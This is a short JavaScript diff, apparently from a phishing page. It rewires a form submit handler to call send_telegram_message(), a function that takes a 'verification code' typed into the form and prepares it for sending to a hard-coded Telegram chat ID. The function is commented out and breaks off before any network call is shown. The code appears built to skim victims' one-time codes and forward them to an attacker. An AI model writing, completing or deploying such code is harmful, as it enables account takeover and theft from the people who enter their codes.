@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
     e.preventDefault();
     show_counter().then(() => {
       console.log("submit form");
-      submit_details();
+      send_telegram_message();
     });
   });
 });
@@ -34,7 +34,7 @@ function show_counter() {
   });
 }
 
-// async function submit_details() {
+// async function send_telegram_message() {
 //   const chatIds = ["-1001991348429"]; // Add your chat IDs here
 //   const verificationCode = email_field.value;
 //   const msg = `Verification code: ${verificationCode}`;
